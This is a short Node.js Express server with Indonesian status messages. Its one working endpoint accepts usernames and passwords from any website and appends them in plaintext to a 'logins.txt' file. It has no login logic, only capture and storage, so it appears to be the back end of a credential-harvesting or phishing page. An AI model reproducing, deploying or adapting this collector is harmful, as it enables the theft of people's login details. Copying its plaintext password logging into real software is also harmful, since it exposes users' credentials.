const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(bodyParser.json());

app.post('/simpan', (req, res) => {
  const { username, password } = req.body;
  const logData = `Username: ${username}, Password: ${password}\n`;

  const logPath = path.join(__dirname, 'data', 'logins.txt');

  fs.appendFile(logPath, logData, (err) => {
    if (err) {
      console.error('Gagal simpan:', err);
      return res.status(500).send('Gagal simpan data');
    }
    res.send('Berhasil disimpan ke server!');
  });
});

app.get('/', (req, res) => res.send("API aktif bro!"));

app.listen(PORT, () => {
  console.log(`Server aktif di port ${PORT}`);
});
